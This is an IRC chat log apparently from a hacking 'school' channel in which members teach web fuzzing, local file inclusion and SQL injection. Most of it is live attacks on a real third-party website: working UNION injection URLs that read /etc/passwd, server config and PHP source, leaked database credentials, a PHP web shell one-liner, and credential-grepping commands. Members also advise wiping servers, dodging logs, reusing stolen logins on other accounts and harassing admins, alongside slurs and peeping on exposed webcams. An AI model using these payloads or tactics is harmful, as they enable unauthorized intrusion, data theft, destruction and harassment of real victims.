+Jun 10 22:37:35 <hatter>	and then exploitation
+Jun 10 22:37:41 <hatter>	and how to analyze inputs
+Jun 10 22:37:51 <TylerDurden>	because: n00bs.
+Jun 10 22:38:00 <LordKitsuna>	tyler would loose money if he did that
+Jun 10 22:38:02 <hatter>	I think they can keep up
+Jun 10 22:38:06 <TylerDurden>	ok.
+Jun 10 22:38:08 <TylerDurden>	well then
+Jun 10 22:38:12 <TylerDurden>	let's skip to fuzzing.
+Jun 10 22:38:20 <TylerDurden>	i assume you can all just fucking figure the google dorks out by now.
+Jun 10 22:38:26 <TylerDurden>	and copy paste a line in your bash script for every one.
+Jun 10 22:38:35 <TylerDurden>	add nmap and a few more things in there.
+Jun 10 22:38:37 <TylerDurden>	ok.
+Jun 10 22:38:39 <TylerDurden>	up to fuzzing.
+Jun 10 22:38:46 <hatter>	lol.  I meant web app fuzzing.
+Jun 10 22:38:53 <TylerDurden>	hatter: i know.
+Jun 10 22:39:05 <TylerDurden>	hatter: easiest way is adding a quote.
+Jun 10 22:39:10 <TylerDurden>	then using diff.
+Jun 10 22:39:24 <hatter>	not always accurate though.
+Jun 10 22:39:28 <TylerDurden>	no.
+Jun 10 22:39:29 <TylerDurden>	Ok
+Jun 10 22:39:37 <TylerDurden>	here's a step by step plan for web app fuzzing.
+Jun 10 22:39:44 <TylerDurden>	See if you can add a single quote, and if shit breaks then.
+Jun 10 22:39:49 <TylerDurden>	See if you can add a double quote and if shit breaks then.
+Jun 10 22:39:55 <TylerDurden>	See if you can add a null byte and if shit breaks then.
+Jun 10 22:40:05 <TylerDurden>	If one of these conditions changes the current page.
+Jun 10 22:40:11 <TylerDurden>	You check if it's a numeric or string field.
+Jun 10 22:40:16 <TylerDurden>	And apply SQLI conditions to it.
+Jun 10 22:40:16 <hatter>	check out a spacebar too.
+Jun 10 22:40:22 <hatter>	or a +
+Jun 10 22:40:27 <TylerDurden>	or a -1
+Jun 10 22:40:32 <hatter>	sometimes stuff gets sanitized, but not all of it
+Jun 10 22:40:41 <TylerDurden>	But since we've covered SQL, let's write a fuzzer.
+Jun 10 22:40:44 <hatter>	the best way to be secure is by whitelisting characters.
+Jun 10 22:41:10 <TylerDurden>	regex.
+Jun 10 22:41:18 <hatter>	delete anything that doesn't fit the criteria.
+Jun 10 22:41:21 <TylerDurden>	Ok. but we're here for offensive shit.
+Jun 10 22:41:23 <hatter>	what TylerDurden said
+Jun 10 22:41:32 <hatter>	Regex applies to that
+Jun 10 22:41:48 <TylerDurden>	regex is a one line fix, writing a fuzzer is a 20 lines program;)
+Jun 10 22:41:54 <TylerDurden>	ok. to fuzz shit, we need to know what to fuzz.
+Jun 10 22:42:02 <TylerDurden>	web forms and urls are the easiest
+Jun 10 22:42:05 <TylerDurden>	let's just start with urls.
+Jun 10 22:42:18 <TylerDurden>	how the fuck do we get fuzzable urls?
+Jun 10 22:42:28 <TylerDurden>	a fuzzable url has some kind of goddamn parameter in it.
+Jun 10 22:42:38 <TylerDurden>	you can bet your ass there's an equal sign in there somewhere.
+Jun 10 22:45:51 <TylerDurden>	fuck, phone call.
+Jun 10 22:45:53 <hatter>	not only that
+Jun 10 22:45:57 <hatter>	Sometimes
+Jun 10 22:46:03 <hatter>	you've seen those "clean urls"
+Jun 10 22:46:18 <hatter>	that just have /something/somethingelse/numberordate
+Jun 10 22:46:29 <hatter>	those are usually parameters to those equal signs
+Jun 10 22:46:37 <hatter>	the variables are just hiding
+Jun 10 22:46:50 <hatter>	a lot of times its part of an MVC application if the URL's are clean
+Jun 10 22:46:57 <hatter>	null bytes, single quotes, etc are awesome
+Jun 10 22:47:12 <hatter>	sometimes, none of them will show up though, if they're using a non-utf8 charset
+Jun 10 22:47:19 <hatter>	meaning multi-byte encodings are possible
+Jun 10 22:47:27 <hatter>	the addslashes() function, in php for example
+Jun 10 22:47:34 <hatter>	is vulnerable if using a multibyte platofrm
+Jun 10 22:47:50 <hatter>	a quote, aka "%27"
+Jun 10 22:47:58 <hatter>	won't change anything
+Jun 10 22:48:04 <hatter>	but %bf%27 will
+Jun 10 22:48:32 <hatter>	because when there's addslashes(), it tries to escape the quote.
+Jun 10 22:48:40 <hatter>	the \ is a \x5c
+Jun 10 22:48:45 <hatter>	%5c
+Jun 10 22:49:00 <hatter>	the characters %bf%27 aren't multibyte
+Jun 10 22:49:10 <hatter>	but %bf%5c%27 are
+Jun 10 22:49:21 <hatter>	so when the sanitizing occurs, you escape the single quote
+Jun 10 22:49:28 <hatter>	and you have another fuzzing method
+Jun 10 22:49:46 <t>	zomg guys they got an uncorrupted hard drive
+Jun 10 22:49:47 <t>	!!!
+Jun 10 22:49:56 *	hatter gives voice to TR0|\|
+Jun 10 22:50:20 <TylerDurden>	do you guys want to see how to write an actual fuzzer, or are you man enough to lern by hand.
+Jun 10 22:50:30 <hatter>	they gotta learn by hand
+Jun 10 22:50:34 <hatter>	before they can write it
+Jun 10 22:50:51 <TylerDurden>	well then.
+Jun 10 22:50:56 <TylerDurden>	what was our tutorial site again?;)
+Jun 10 22:51:05 <hatter>	tutorial site?
+Jun 10 22:51:05 <LordKitsuna>	japfap.ath.cx
+Jun 10 22:51:09 <hatter>	Oh
+Jun 10 22:51:11 <hatter>	Uh oh
+Jun 10 22:51:11 <hatter>	lol
+Jun 10 22:51:16 <LordKitsuna>	 /testshit
+Jun 10 22:51:26 <Mutiny>	japfap.ath.cx/testshit? lolol
+Jun 10 22:51:33 <TylerDurden>	http://japfap.ath.cx/testshit/page/
+Jun 10 22:51:38 <TylerDurden>	go fuzz.
+Jun 10 22:53:17 *	hatter has kicked hatter from #school4lulz (testing)
+Jun 10 22:53:23 *	ChanServ sets mode +a #school4lulz hatter
+Jun 10 22:53:23 *	ChanServ gives channel operator status to hatter
+Jun 10 22:53:57 <hatter>	wrd
+Jun 10 22:54:13 <TylerDurden>	anyone FIND the lfi yet?
+Jun 10 22:54:40 <LordKitsuna>	they had a reverse shell on the site at one point
+Jun 10 22:54:51 <LordKitsuna>	but i got rid of that at some point
+Jun 10 22:55:56 <hatter>	lol
+Jun 10 22:56:02 *	t gives channel half-operator status to Dox
+Jun 10 22:56:08 <TylerDurden>	ok.
+Jun 10 22:56:13 <TylerDurden>	basic way to test for LFI guise.
+Jun 10 22:56:21 <TylerDurden>	say you have a page with include=autism.txt
+Jun 10 22:56:35 <hatter>	lol
+Jun 10 22:56:39 <TylerDurden>	and you are in directory /admin/fail.php?include=autism.txt
+Jun 10 22:56:41 <hatter>	pretty much
+Jun 10 22:56:44 <TylerDurden>	and you are in directory /admin/fail.php?include=../admin/autism.txt
+Jun 10 22:56:54 <TylerDurden>	does that werk?
+Jun 10 22:56:57 <TylerDurden>	if yes: lfi.
+Jun 10 22:57:03 <hatter>	rofl
+Jun 10 22:57:27 *	ChanServ sets mode +q #school4lulz Fox
+Jun 10 22:57:34 <Fox>	LordKitsuna pastebin once done
+Jun 10 22:57:46 <TylerDurden>	/admin/fail.php?include=../../../../../../etc/passwd%00 <- does that werk?
+Jun 10 22:57:48 <TylerDurden>	if yes: lfi
+Jun 10 22:57:53 <TylerDurden>	now: a filesystem has a path limit.
+Jun 10 22:57:59 <TylerDurden>	that path limit is usually 255 characters.
+Jun 10 22:58:03 <TylerDurden>	sometimes null bytes do not work.
+Jun 10 22:58:05 <hatter>	^
+Jun 10 22:58:11 <TylerDurden>	so we can increase the directory traversal length by one letter each time untill we hit the path limit.
+Jun 10 22:58:14 <LordKitsuna>	Fox, so im the pastebinner? kk just highlight me agaibn when done
+Jun 10 22:58:17 <TylerDurden>	and voilla, we dont need a null byte anymore.
+Jun 10 22:58:31 <TylerDurden>	once you have a lfi, you can get a passwords file.
+Jun 10 22:58:35 <TylerDurden>	passwords files are shit useless.
+Jun 10 22:58:44 <TylerDurden>	/etc/shadow is where the party is at.
+Jun 10 22:58:58 <TylerDurden>	you can however include /proc/self/environ or the like
+Jun 10 22:59:08 <TylerDurden>	this shows your http request in the website's page.
+Jun 10 22:59:09 <TylerDurden>	cool.
+Jun 10 22:59:10 <Mutiny>	http://www.sparkynet.com/turtle/etc/passwd There isn't a /etc/shadow here :-(
+Jun 10 22:59:22 <TylerDurden>	this INCLUDES your http request in it.
+Jun 10 22:59:34 <TylerDurden>	wait.
+Jun 10 22:59:37 <TylerDurden>	it includes it?
+Jun 10 22:59:40 <TylerDurden>	fullretard.jpg.exe.tiff
+Jun 10 22:59:56 <TylerDurden>	now you can drop a php shell in your useragent for instance
+Jun 10 22:59:58 <hatter>	loool
+Jun 10 23:00:01 <TylerDurden>	preferably you put a php shell in your post data.
+Jun 10 23:00:08 <TylerDurden>	because post data usually doesn't get logged.
+Jun 10 23:00:12 <xochipilli>	or cookie
+Jun 10 23:00:13 <hatter>	or cookie data
+Jun 10 23:00:16 <xochipilli>	heh
+Jun 10 23:00:17 <hatter>	lol
+Jun 10 23:00:18 <hatter>	xochipilli: <3
+Jun 10 23:00:20 <TylerDurden>	so, you put a php shell in post or cookie.
+Jun 10 23:00:21 <xochipilli>	<3
+Jun 10 23:00:44 <Fox>	 /away
+Jun 10 23:00:46 <Fox>	you all be good
+Jun 10 23:00:46 <Fox>	:3
+Jun 10 23:01:16 <hatter>	kk
+Jun 10 23:01:21 <TylerDurden>	<? system($_POST[penis]);exit; ?>
+Jun 10 23:01:21 <xochipilli>	nn
+Jun 10 23:01:27 <TylerDurden>	that's an example of a php shell.
+Jun 10 23:01:28 <TylerDurden>	it's that easy.
+Jun 10 23:01:33 <xochipilli>	do u rly need the exit?
+Jun 10 23:01:37 <hatter>	you don't even rly need exit
+Jun 10 23:01:38 <TylerDurden>	ya.
+Jun 10 23:01:41 <hatter>	nah
+Jun 10 23:01:42 <TylerDurden>	ya u do.
+Jun 10 23:01:42 <hatter>	you dont
+Jun 10 23:01:44 <hatter>	lol
+Jun 10 23:01:45 <xochipilli>	^
+Jun 10 23:01:56 <TylerDurden>	technically you could screw the output/break off the send in the next line.
+Jun 10 23:02:02 <TylerDurden>	so technically you need exit;)
+Jun 10 23:02:06 <hatter>	no.
+Jun 10 23:02:22 <hatter>	if you're executing a system call
+Jun 10 23:02:26 <hatter>	it returns when the call ends.
+Jun 10 23:02:37 <hatter>	so when the normal app ends, even if its only one command
+Jun 10 23:02:39 <hatter>	it returns 0
+Jun 10 23:02:43 <hatter>	like we learned in assembly class
+Jun 10 23:03:07 <hatter>	So the process just ends like it would with exit.
+Jun 10 23:03:24 <TylerDurden>	heh. k.
+Jun 10 23:03:30 <TylerDurden>	i never did much php:P
+Jun 10 23:03:39 <TylerDurden>	can rape it pretty well tough
+Jun 10 23:03:49 <hatter>	same.
+Jun 10 23:03:50 <hatter>	lol
+Jun 10 23:04:00 <TylerDurden>	ok. so now you've got a php shell.
+Jun 10 23:04:03 <TylerDurden>	that's cute
+Jun 10 23:04:27 <hatter>	start looking at files & runnin decent commands
+Jun 10 23:04:36 <TylerDurden>	you can for instance read db files, install a user backdoor.
+Jun 10 23:04:37 <TylerDurden>	check the user you're logged in, see if the fucktard has a bash_history
+Jun 10 23:04:58 <hatter>	find -name \*conf\* -exec grep -i "user\|database\|host" '{}' \;
+Jun 10 23:05:00 <TylerDurden>	but since you got in trough lfi anyways, chances are the security is shit.
+Jun 10 23:05:21 <TylerDurden>	so try uname -a
+Jun 10 23:05:29 <TylerDurden>	it shows the day the kernel was compiled, and which version it's running.
+Jun 10 23:05:40 <TylerDurden>	old kernel = fail kernel = probably exploitable.
+Jun 10 23:06:09 <hatter>	not always.
+Jun 10 23:06:09 *	TylerDurden gives voice to whiteh8
+Jun 10 23:06:17 <hatter>	depends on where you see it
+Jun 10 23:06:24 <hatter>	if its a big static probably modified build
+Jun 10 23:06:26 <hatter>	stay away
+Jun 10 23:06:29 <hatter>	you're being logged
+Jun 10 23:06:30 <hatter>	lol
+Jun 10 23:06:37 <TylerDurden>	find / -type f -perm 0777 <-find writable folders.
+Jun 10 23:06:43 <hatter>	and executable
+Jun 10 23:07:03 <hatter>	not all writable folders can be written to
+Jun 10 23:07:11 <hatter>	with applications
+Jun 10 23:07:11 <TylerDurden>	not by YOU anyways.
+Jun 10 23:07:13 <TylerDurden>	:P
+Jun 10 23:07:15 <hatter>	and still have the applications work
+Jun 10 23:07:33 <hatter>	you could try chmod
+Jun 10 23:07:36 <TylerDurden>	so the first thing you want to do is get a writable folder.
+Jun 10 23:07:36 <hatter>	but that might not always work
+Jun 10 23:07:44 <TylerDurden>	you could also see if you're allowed to make device nodes in a folder;)
+Jun 10 23:07:47 <hatter>	with execute permissions
+Jun 10 23:07:53 *	Dox is now known as Dox_
+Jun 10 23:07:59 <hatter>	mknod :D
+Jun 10 23:08:02 <Dox_>	night all
+Jun 10 23:08:06 <Dox_>	night hatter
+Jun 10 23:08:08 <TylerDurden>	night dox.
+Jun 10 23:08:10 <hatter>	night
+Jun 10 23:08:28 <TylerDurden>	ok, mknod + setting permissions is pretty win too.
+Jun 10 23:08:33 <hatter>	^
+Jun 10 23:08:42 <TylerDurden>	basically, find shit the admin didn't think of to get around file permissions.
+Jun 10 23:09:03 <TylerDurden>	i like setting all my temp directories nonexecutable, no device nodes, and no file listin'.
+Jun 10 23:09:19 <TylerDurden>	basic users can only read/write their home dir, and not set execute permissions.
+Jun 10 23:09:36 <TylerDurden>	you might also want to prevent them from reading keyboard shite.
+Jun 10 23:09:42 <TylerDurden>	or other I/O
+Jun 10 23:09:52 <Mutiny>	http://www.larrywseymour.com/robots.txt/robots.txt that's one of the larger robots.txt I've found so far xD
+Jun 10 23:10:03 <TylerDurden>	as an attacker, keyboard or other I/O can tell you if there's an admin on the box.
+Jun 10 23:10:39 <TylerDurden>	if there's an admin, wait the fuck up and hide till he's gone.
+Jun 10 23:11:02 <TylerDurden>	now.
+Jun 10 23:11:04 <TylerDurden>	for exploiting high profile sites
+Jun 10 23:11:04 <TylerDurden>	YOU ARE MONITORED.
+Jun 10 23:11:21 <TylerDurden>	Hence executing shell command MIGHT Not be the best way to do shit.
+Jun 10 23:11:29 <TylerDurden>	Myself i prefer using an extendable piece of shellcode.
+Jun 10 23:11:35 <TylerDurden>	That is: shell code i can augment with shit i need on the fly.
+Jun 10 23:11:58 <TylerDurden>	So before yuo go thinkin' that ssh is the only way, it isn't.
+Jun 10 23:12:15 <TylerDurden>	it's actually a pretty fucktarded way, because: logs.
+Jun 10 23:12:32 <TylerDurden>	any server worth it's salt is going to have someone that reads the logs.
+Jun 10 23:13:02 <hatter>	or if you want to be lolz
+Jun 10 23:13:04 <TylerDurden>	In case there's an IDS or more security, there's probably backups of those logs too.
+Jun 10 23:13:05 <hatter>	if you see an admin
+Jun 10 23:13:10 <hatter>	and you can execute the write command
+Jun 10 23:13:18 <t>	execpt sony they obv dnt check shit :P(sorry had to go there)
+Jun 10 23:13:19 <hatter>	you can see root logged in with `w'
+Jun 10 23:13:39 <hatter>	cat /dev/urandom | write root &
+Jun 10 23:13:46 <hatter>	kick that bitch off his terminal
+Jun 10 23:13:52 <hatter>	only if you do something like
+Jun 10 23:14:36 <TylerDurden>	Anyways, in case you notice that they are running any decent IDS, you pack your shit, rm-rf the server and run.
+Jun 10 23:15:04 <hatter>	w|awk '/ro[o]t// {print "cat /dev/urandom | write root "$2" &"}|sh &
+Jun 10 23:15:16 <hatter>	w|awk '/ro[o]t/ {print "cat /dev/urandom | write root "$2" &"}|sh &
+Jun 10 23:15:17 <hatter>	*
+Jun 10 23:15:22 <TylerDurden>	because 99% of the time it isn't worth it to have access to that box, 'cause you wont stay on it for long.
+Jun 10 23:15:33 <TylerDurden>	Unless you somehow manage to get a kernel patch onto it;)
+Jun 10 23:15:39 <hatter>	^
+Jun 10 23:16:03 <TylerDurden>	Kernel patching is awesome, but i suck at it.
+Jun 10 23:16:06 <hatter>	that can come in a module, a hook to /dev/kmem, a hook to /proc/cpu/microcode, etc
+Jun 10 23:16:09 <TylerDurden>	So i usually just nuke.
+Jun 10 23:17:14 <hatter>	passin out.
+Jun 10 23:17:26 <Mutiny>	its lulzy just how much shit google can find me
+Jun 10 23:17:36 <Mutiny>	http://202.212.193.26:555/CgiStart?page=Single&Mode=Motion&Language=0 <-- random camera
+Jun 10 23:17:45 <TylerDurden>	yeah.
+Jun 10 23:17:58 <TylerDurden>	The basic idea is: GET INFORMATION
+Jun 10 23:18:02 <TylerDurden>	See the shit they are running.
+Jun 10 23:18:05 <TylerDurden>	Search for known exploits.
+Jun 10 23:18:06 <TylerDurden>	can't find one? make one.
+Jun 10 23:18:13 <TylerDurden>	You know shit code when you see it.
+Jun 10 23:18:39 <TylerDurden>	So, anyone fancy a go at a real server, @ info gathering?
+Jun 10 23:18:51 <whiteh8>	<-----_____-----
+Jun 10 23:19:40 <TylerDurden>	http://www.ourkids.net/ <-remember that site?
+Jun 10 23:19:43 <TylerDurden>	let's rape our kids.
+Jun 10 23:19:44 <TylerDurden>	lulz.
+Jun 10 23:19:59 <Mutiny>	lulz
+Jun 10 23:20:13 <TylerDurden>	http://www.ourkids.net/school/school-profile.php?id=157%27 here's the SQL vulnerable url.
+Jun 10 23:20:16 <TylerDurden>	you know what to do.
+Jun 10 23:20:45 <God>	anyone know how to bypass opendns
+Jun 10 23:21:08 <TylerDurden>	God: bro u tryin' to hax me?
+Jun 10 23:21:34 <God>	naw this wack ass ap im on has opendns because its a business
+Jun 10 23:21:47 <God>	and i cant view most sites
+Jun 10 23:21:51 <God>	bc of the shit
+Jun 10 23:22:53 <LordKitsuna>	God, ssh
+Jun 10 23:23:24 <LordKitsuna>	God, and i am pretty sure if you manually set your computer to a spicific dns it gets past it
+Jun 10 23:23:30 <LordKitsuna>	try setting your comp to use googledns
+Jun 10 23:23:35 <LordKitsuna>	see what happens
+Jun 10 23:25:32 <TylerDurden>	http://www.ourkids.net/school/school-basic-profile.php?id=157%27%20or%201=1/* <-here's how to SQL it btw.
+Jun 10 23:25:36 <TylerDurden>	ok.
+Jun 10 23:25:41 <TylerDurden>	everyone got /etc/passwd by now?
+Jun 10 23:27:41 <TylerDurden>	hatter: how 'bout you?
+Jun 10 23:28:50 <TylerDurden>	ok. here's a hint
+Jun 10 23:28:54 <TylerDurden>	it's a 60 column injection.
+Jun 10 23:29:17 <TylerDurden>	http://www.ourkids.net/school/school-basic-profile.php?id=157%27%20and%201=2%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60/*
+Jun 10 23:29:35 <TylerDurden>	http://www.ourkids.net/school/school-basic-profile.php?id=157%27%20and%201=2%20UNION%20SELECT%201,2,CONCAT_WS%28CHAR%2832,58,32%29,user%28%29,database%28%29,version%28%29%29,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60/*
+Jun 10 23:30:05 <TylerDurden>	http://www.ourkids.net/school/school-basic-profile.php?id=157%27%20and%201=2%20UNION%20SELECT%201,2,LOAD_FILE%28%27/etc/passwd%27%29,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60/*
+Jun 10 23:30:10 <TylerDurden>	ok.
+Jun 10 23:30:11 <TylerDurden>	now you all have /etc/passwd.
+Jun 10 23:30:14 <LordKitsuna>	if this doesnt convince you guys to use ssl always idk waht will http://i.imgur.com/1eKyU.jpg
+Jun 10 23:30:51 <TylerDurden>	so.
+Jun 10 23:30:57 <TylerDurden>	any of you fags got the password file yet?
+Jun 10 23:31:10 <TylerDurden>	since i basically handed it to u.
+Jun 10 23:31:15 *	TylerDurden sets mode -m #school4lulz
+Jun 10 23:31:18 <TylerDurden>	unmuted so you can spam too.
+Jun 10 23:31:56 <eax>	just tuned in: to bypass some restrictions you can also convert /etc/passwd into hex or use the char() function
+Jun 10 23:32:05 <TylerDurden>	eax: already covered.
+Jun 10 23:32:10 <eax>	ah k
+Jun 10 23:32:10 <ref>	got it...
+Jun 10 23:32:24 <TylerDurden>	apache:x:48:48:Apache:/var/www:/sbin/nologin
+Jun 10 23:32:31 <TylerDurden>	what does that tell us?
+Jun 10 23:33:52 <TylerDurden>	it tells us that it's using the default wwwroot, right.
+Jun 10 23:35:05 <ref>	presumably
+Jun 10 23:35:06 <llama>	also shadow
+Jun 10 23:35:48 <TylerDurden>	shadow file already?
+Jun 10 23:35:49 <TylerDurden>	lulz.
+Jun 10 23:35:50 <TylerDurden>	nice.
+Jun 10 23:36:21 <LordKitsuna>	who is failing at port scanning the test server?
+Jun 10 23:36:30 <llama>	heh, I wish.  no, I was answering your question (what does that tell us?)
+Jun 10 23:36:45 <LordKitsuna>	*Port Scan* detected from 180.149.96.69 (MN/Mongolia/-). 11 hits in the last 109 seconds - *Blocked in csf* [PS_LIMIT]
+Jun 10 23:36:51 <garrett>	ddd
+Jun 10 23:37:09 <TylerDurden>	nuke it.
+Jun 10 23:39:22 <Mutiny>	ok so
+Jun 10 23:39:23 <Mutiny>	my fucking
+Jun 10 23:39:25 <Mutiny>	firefox
+Jun 10 23:39:26 <Mutiny>	just saiod
+Jun 10 23:39:27 <Mutiny>	said
+Jun 10 23:39:31 <God>	naw dns
+Jun 10 23:39:32 <Mutiny>	"shh don't tell the terrorists"
+Jun 10 23:39:34 <Mutiny>	wtf
+Jun 10 23:39:46 <God>	googdns fucked my shit off
+Jun 10 23:39:47 <God>	:/
+Jun 10 23:39:53 <God>	nevermind ima figure this out
+Jun 10 23:40:03 <TylerDurden>	http://www.ourkids.net/school/school-basic-profile.php?id=157%27%20and%201=2%20UNION%20SELECT%201,2,LOAD_FILE%28%27/etc/httpd/conf/httpd.conf%27%29,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60/* hint: httpd.conf
+Jun 10 23:40:28 <TylerDurden>	DocumentRoot "/var/www/html"
+Jun 10 23:40:57 <whiteh8>	Fox, where you at homeboy
+Jun 10 23:41:56 <Mutiny>	bahahahahahahaha
+Jun 10 23:42:01 <Mutiny>	http://180.148.197.212:81/ViewerFrame?Mode=Motion&Resolution=640x480&Quality=Clarity&PresetOperation=Move&Language=5 sweatshop camera ftw
+Jun 10 23:43:10 <TylerDurden>	lol
+Jun 10 23:43:13 <TylerDurden>	looks like someone nuked the logs.
+Jun 10 23:45:22 <JBAIT>	someone trying to figure out where the sweatshop is ?
+Jun 10 23:45:33 <ref>	in my shed
+Jun 10 23:46:00 <Hellspawn>	japan somewhere
+Jun 10 23:46:06 <Hellspawn>	all the writing is in jap
+Jun 10 23:46:14 <JBAIT>	ya sure
+Jun 10 23:46:18 <TylerDurden>	http://www.ourkids.net/school/school-basic-profile.php?id=157%27%20and%201=2%20UNION%20SELECT%201,2,LOAD_FILE%28%27/var/www/html/ourkids.net/camp/camp-life.php%27%29,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60/* you can read their php code now.
+Jun 10 23:46:19 <JBAIT>	looked chinese
+Jun 10 23:46:28 <TylerDurden>	ok, what do we see here with this new info?
+Jun 10 23:46:34 <TylerDurden>	except that we can drop into outfile and get a php shell?
+Jun 10 23:46:49 <ryan1918>	what the fuck
+Jun 10 23:46:50 <ryan1918>	is this
+Jun 10 23:46:54 <ryan1918>	a 1 2 3 how to hack
+Jun 10 23:46:55 <TylerDurden>	$server = "localhost";
+Jun 10 23:46:55 <TylerDurden>	$username = "webuser";
+Jun 10 23:46:55 <TylerDurden>	$password = "webUSer!@";
+Jun 10 23:46:55 <TylerDurden>	$database = "camp_directory";
+Jun 10 23:47:01 <TylerDurden>	shit passwords is what we noticed.
+Jun 10 23:47:15 <TylerDurden>	you can now insert penis into database.
+Jun 10 23:47:24 <llama>	:-D
+Jun 10 23:47:33 <TylerDurden>	let's drop a php shell shall we?
+Jun 10 23:47:57 <ryan1918>	lets drop sumin
+Jun 10 23:48:00 <ryan1918>	fo sho
+Jun 10 23:48:52 <TylerDurden>	ok, into outfile = no permissions.
+Jun 10 23:49:00 <TylerDurden>	so, what do we do next.
+Jun 10 23:49:26 <TylerDurden>	right, we see if they REUSE the shit pass on the db, we see if we can use the db login for michief, we see if we can extract tables and dox.
+Jun 10 23:49:37 <TylerDurden>	first one to get dox can use them.
+Jun 10 23:49:46 <TylerDurden>	how 2 use dox:
+Jun 10 23:49:52 <TylerDurden>	you write a bash scripts that remove dups.
+Jun 10 23:49:57 <TylerDurden>	using sed/grep
+Jun 10 23:50:07 <ref>	can i use perl lol
+Jun 10 23:50:24 <TylerDurden>	sure.
+Jun 10 23:50:24 <TylerDurden>	you then try these dox against common sites, gmail facebook etc.
+Jun 10 23:50:30 <TylerDurden>	you dump the ones that have .gov .mil extensions or are reused.
+Jun 10 23:50:38 <TylerDurden>	you see if you can use those to root MORE sites.
+Jun 10 23:50:48 <Hellspawn>	LOL @ camera
+Jun 10 23:50:51 <Hellspawn>	she saw it move
+Jun 10 23:51:17 <TylerDurden>	now for the people more into exploiting, this server runs a vulnerable openssh too.
+Jun 10 23:51:21 <TylerDurden>	so it's pretty much the ideal test target.
+Jun 10 23:51:31 <TylerDurden>	and a vulnerable mysql, you can load modules.
+Jun 10 23:51:35 <JBAIT>	bra shot XD
+Jun 10 23:51:44 <TylerDurden>	post ling.
+Jun 10 23:51:48 <Mutiny>	http://221.251.109.90:84/CgiStart?page=Multi&Language=0 Kittehs camera
+Jun 10 23:51:52 <TR0|\|>	going to load a php shell?
+Jun 10 23:52:10 <TylerDurden>	TR0: no thats what ur sposed to do.
+Jun 10 23:52:21 <TylerDurden>	oy look, pale gook legs.
+Jun 10 23:52:36 *	cereal is now known as venuism
+Jun 10 23:53:37 <TylerDurden>	ok. now that you know how2sqli, you're pretty much on par with GFORCE PAKISTAN/INDIAN kiddies.
+Jun 10 23:53:55 <TylerDurden>	we cant write to wwwroot tough, and this is annoying.
+Jun 10 23:53:59 <TylerDurden>	we have a sql user and sql exploits.
+Jun 10 23:54:09 <TylerDurden>	exploitin' that is left as an exercise to the reader.
+Jun 10 23:54:28 <TylerDurden>	but i'm of course willing to help in case you want to go further.
+Jun 10 23:54:48 <ref>	thanks for the lesson TylerDurden, much more interesting than HC11 rubbish
+Jun 10 23:55:20 <JBAIT>	Thank you TylerDurden 
+Jun 10 23:55:27 <TylerDurden>	http://www.ourkids.net/school/school-basic-profile.php?id=157%27%20and%201=2%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60%20INTO%20OUTFILE%20%27/var/tmp/niggers%27%20/* <-you can write /var/tmp tough.
+Jun 10 23:55:47 <TylerDurden>	requesting -m
+Jun 10 23:55:57 <Tony>	is -m~)~
+Jun 10 23:56:05 <TylerDurden>	lulz, so silent.
+Jun 10 23:56:35 <ref>	now to modify frequency scaling kernel module?
+Jun 10 23:56:44 <TylerDurden>	;)
+Jun 10 23:57:07 <ref>	nothing like a bit of magic smoke in the server room
+Jun 10 23:58:04 <wutthe>	it's good stuff, thanks
+Jun 10 23:58:40 <wutthe>	i missed a little bit of the discussion, how do you generate those values?
+Jun 10 23:59:16 <eax>	what values?
+Jun 10 23:59:19 <wutthe>	i mean i assume the 1,2,3,4 is like a buffer overflow?
+Jun 10 23:59:29 <whiteh8>	:|
+Jun 10 23:59:31 <eax>	those are columns
+Jun 10 23:59:42 <eax>	can be found by the 'order by' statement
+Jun 10 23:59:49 <wutthe>	sorry, i joined after the intro
+Jun 10 23:59:56 <eax>	lol np
+Jun 10 23:59:59 <whiteh8>	you just need to know sql to understand
+Jun 11 00:00:29 <wutthe>	ok thanks, i will read a little more and follow along
+Jun 11 00:00:57 <eax>	someone should pastebin this and pm me it
+Jun 11 00:01:04 <eax>	so i can forward it to fox later
+Jun 11 00:01:46 <TylerDurden>	http://www.securityfocus.com/bid/19559 also elevate to mysql root
+Jun 11 00:01:51 <TylerDurden>	see if you can do into outfile then;)
+Jun 11 00:02:04 <TylerDurden>	if you couldn't on a normal mysql user
+Jun 11 00:02:09 <TylerDurden>	(not in this case tough)
+Jun 11 00:02:16 <ref>	security focus still exists!?
+Jun 11 00:02:57 <TylerDurden>	ya
+Jun 11 00:03:11 *	ref has been hiding in a loopback world for a few years
+Jun 11 00:03:31 <micja>	just don't use DROP ;)
+Jun 11 00:04:23 <TylerDurden>	i'll probably post an extended bash script on how2 server info l8er.
+Jun 11 00:05:09 <Tony>	hellothere
+Jun 11 00:05:53 <hellothere>	what?
+Jun 11 00:05:56 <JBAIT>	 to the chinese camop, try n figure out where this place is, then pimp the chick ;P
+Jun 11 00:06:00 <ryan1918>	hellothere
+Jun 11 00:06:02 <ryan1918>	FAGGIT
+Jun 11 00:06:29 <ref>	JBAIT its not chinese
+Jun 11 00:06:31 <ref>	turn the camera around
+Jun 11 00:07:16 <ryan1918>	!kick hellothere sucka
+Jun 11 00:07:22 <JBAIT>	i saw the letters, but i don't understand what language they r
+Jun 11 00:07:31 <Tony>	italiano_O?
